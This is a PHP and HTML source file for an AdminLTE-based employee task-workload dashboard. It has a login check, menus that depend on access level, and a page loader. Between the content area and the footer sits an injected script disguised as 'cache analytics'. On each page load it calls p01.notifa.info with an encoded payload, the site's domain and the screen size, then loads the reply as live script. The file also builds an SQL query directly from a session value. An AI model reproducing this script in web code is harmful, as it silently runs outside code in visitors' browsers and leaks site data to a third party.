<?php
include 'function/koneksi.php';
include 'function/fungsi.php';
if (empty($_SESSION['nip'])) {
	header("Location:login_page.php");
}

?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>WORKLOAD | PT.PAL</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="plugins/iCheck/flat/blue.css">
  <!-- Morris chart -->
  <link rel="stylesheet" href="plugins/morris/morris.css">
  <!-- jvectormap -->
  <link rel="stylesheet" href="plugins/jvectormap/jquery-jvectormap-1.2.2.css">
  <!-- Date Picker -->
  <link rel="stylesheet" href="plugins/datepicker/datepicker3.css">
  <!-- Daterange picker -->
  <link rel="stylesheet" href="plugins/daterangepicker/daterangepicker-bs3.css">
  <!-- bootstrap wysihtml5 - text editor -->
  <link rel="stylesheet" href="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
  
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

  <!-- Navbar -->
  <nav class="main-header navbar navbar-expand bg-white navbar-light border-bottom">
    <!-- Left navbar links -->
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" data-widget="pushmenu" href="#"><i class="fa fa-bars"></i></a>
      </li>
      <li class="nav-item d-none d-sm-inline-block">
        <a href="index.php" class="nav-link">Home</a>
      </li>
      <li class="nav-item d-none d-sm-inline-block">
        <a href="#" class="nav-link">Contact</a>
      </li>
    </ul>

    <!-- SEARCH FORM -->
    <form class="form-inline ml-3">
      <div class="input-group input-group-sm">
        <input class="form-control form-control-navbar" type="search" placeholder="Search" aria-label="Search">
        <div class="input-group-append">
          <button class="btn btn-navbar" type="submit">
            <i class="fa fa-search"></i>
          </button>
        </div>
      </div>
    </form>

    <!-- Right navbar links -->
    <ul class="navbar-nav ml-auto">
      <li class="nav-item">
        <a class="nav-link" data-widget="control-sidebar" data-slide="true" href="#"><i
            class="fa fa-th-large"></i></a>
      </li>
    </ul>
  </nav>
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a href="index.php" class="brand-link">
		<?php $sql = mysqli_query($conn, "SELECT * FROM pegawai where nip='$_SESSION[nip]'");
											$row = mysqli_fetch_array($sql);
		?>
	  <h1 class="brand-text font-weight-light"><b><?php echo $_SESSION['divisi']; ?></b></h1>
	  <span class="brand-text font-weight-light"><?php echo $_SESSION['jabatan']; ?></span>
    </a>

    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      <div class="user-panel mt-3 pb-3 mb-3 d-flex">
        <div class="image">
          <img src="dist/img/user2-160x160.jpg" class="img-circle elevation-2" alt="User Image">
        </div>
        <div class="info">
			<?php $sql = mysqli_query($conn, "SELECT * FROM pegawai where nip='$_SESSION[nip]'");
										$row = mysqli_fetch_array($sql);
			?>
          <a href="#" class="d-block"><?php echo $_SESSION['nama']; ?></a>
        </div>
      </div>

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->

              <li class="nav-item">
                <a href="./index.php" class="nav-link">
                  <i class="fa fa-dashboard nav-icon"></i>
                  <p>Dashboard</p>
                </a>
              </li>
              <li class="nav-item has-treeview">
                <a href="#" class="nav-link">
                  <i class="nav-icon fa fa-book"></i>
                  <p>
                    Task
                    <i class="right fa fa-angle-left"></i>
                  </p>
                </a>
                <ul class="nav nav-treeview">
                <?php if ($_SESSION['hak_akses'] != '2') { ?>
                  <li class="nav-item">
                    <a href="?p=tambah_task" class="nav-link">
                      <i class="fa fa-circle-o nav-icon"></i>
                      <p>Add Task</p>
                    </a>
                  </li>
                  <?php } ?>

                  <?php if ($_SESSION['hak_akses'] != '2') { ?>
                  <li class="nav-item">
                    <a href="?p=lihat_task" class="nav-link">
                      <i class="fa fa-circle-o nav-icon"></i>
                      <p>Lihat Task</p>
                    </a>
                  </li>
                  <?php } ?>

                  <?php if ($_SESSION['hak_akses'] != '2') { ?>
                  <li class="nav-item">
                    <a href="?p=tambah_pj" class="nav-link">
                      <i class="fa fa-circle-o nav-icon"></i>
                      <p>Penanggung Jawab</p>
                    </a>
                  </li>
                  <?php } ?>

                  <?php if ($_SESSION['hak_akses'] != '1') { ?>
                  <li class="nav-item">
                    <a href="?p=daftar_task" class="nav-link">
                      <i class="fa fa-circle-o nav-icon"></i>
                      <p>Daftar Task</p>
                    </a>
                  </li>
                  <?php } ?>

                </ul>

              <li class="nav-item">
                <a href="./function/logout.php" class="nav-link">
                  <i class="nav-icon fa fa-gear"></i>
                  <p>
                    Logout
                  </p>
                </a>
              </li>
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>
    <!-- Main content -->
        <div class="content-wrapper">
				<!-- Content area -->
          <div class="content">
            <?php
              $pages_dir = 'pages';
              if (!empty($_GET['p'])) {
                  $pages = scandir($pages_dir, 0);
                  unset($pages[0], $pages[1]);
                  $p = $_GET['p'];
              if (in_array($p . '.php', $pages))
                  include($pages_dir . '/' . $p . '.php');
              else
                  echo 'Halaman tidak ditemukan! :(';
              } else
                  include($pages_dir . '/home.php');
            ?>
          </div>
        </div>
    <!-- /.content -->
  </div>

  <script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function() {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
					"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE" +
					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function() {});
		};
	</script>
  <!-- /.content-wrapper -->
  <footer class="main-footer">
    <strong>Copyright &copy; 2014-2018 <a href="http://adminlte.io">AdminLTE.io</a>.</strong>
    All rights reserved.
    <div class="float-right d-none d-sm-inline-block">
      <b>Version</b> 3.0.0-alpha
    </div>
  </footer>

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->
</div>
<!-- ./wrapper -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- jQuery UI 1.11.4 -->
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js"></script>
<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
<script>
  $.widget.bridge('uibutton', $.ui.button)
</script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- Morris.js charts -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.1.0/raphael-min.js"></script>
<script src="plugins/morris/morris.min.js"></script>
<!-- Sparkline -->
<script src="plugins/sparkline/jquery.sparkline.min.js"></script>
<!-- jvectormap -->
<script src="plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>
<script src="plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
<!-- jQuery Knob Chart -->
<script src="plugins/knob/jquery.knob.js"></script>
<!-- daterangepicker -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.10.2/moment.min.js"></script>
<script src="plugins/daterangepicker/daterangepicker.js"></script>
<!-- datepicker -->
<script src="plugins/datepicker/bootstrap-datepicker.js"></script>
<!-- Bootstrap WYSIHTML5 -->
<script src="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>
<!-- Slimscroll -->
<script src="plugins/slimScroll/jquery.slimscroll.min.js"></script>
<!-- FastClick -->
<script src="plugins/fastclick/fastclick.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.js"></script>
<!-- AdminLTE dashboard demo (This is only for demo purposes) -->
<script src="dist/js/pages/dashboard.js"></script>
<!-- AdminLTE for demo purposes -->
<script src="dist/js/demo.js"></script>
</body>
</html>
